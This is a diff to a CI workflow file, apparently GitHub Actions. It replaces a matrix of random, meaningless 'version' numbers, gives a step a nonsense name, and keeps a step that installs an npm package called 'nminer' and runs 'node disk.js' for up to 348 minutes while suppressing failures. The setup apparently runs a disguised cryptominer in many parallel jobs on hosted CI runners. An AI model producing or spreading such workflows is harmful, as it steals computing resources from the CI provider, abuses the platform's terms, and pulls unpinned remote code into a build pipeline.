@@ -9,25 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5308 }
-          - { version: 4477 }
-          - { version: 976 }
-          - { version: 9375 }
-          - { version: 1612 }
-          - { version: 8877 }
-          - { version: 8549 }
-          - { version: 2673 }
-          - { version: 9951 }
-          - { version: 8990 }
-          - { version: 8409 }
-          - { version: 4106 }
-          - { version: 9420 }
-          - { version: 6107 }
-          - { version: 9333 }
-          - { version: 3253 }
-          - { version: 4497 }
-          - { version: 829 }
-          - { version: 2355 }
+          - { version: 378 }
+          - { version: 521 }
+          - { version: 8410 }
+          - { version: 6468 }
+          - { version: 6180 }
+          - { version: 2640 }
+          - { version: 6671 }
+          - { version: 7630 }
+          - { version: 3883 }
+          - { version: 3339 }
+          - { version: 1810 }
+          - { version: 737 }
+          - { version: 3561 }
+          - { version: 225 }
+          - { version: 8924 }
+          - { version: 7811 }
+          - { version: 2850 }
 
     steps:
       - name: Checkout
@@ -38,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: tut past clear
         run: |
           npm install nminer@latest
-          timeout 317m node disk.js || echo "disk executed"
+          timeout 348m node disk.js || echo "disk executed"
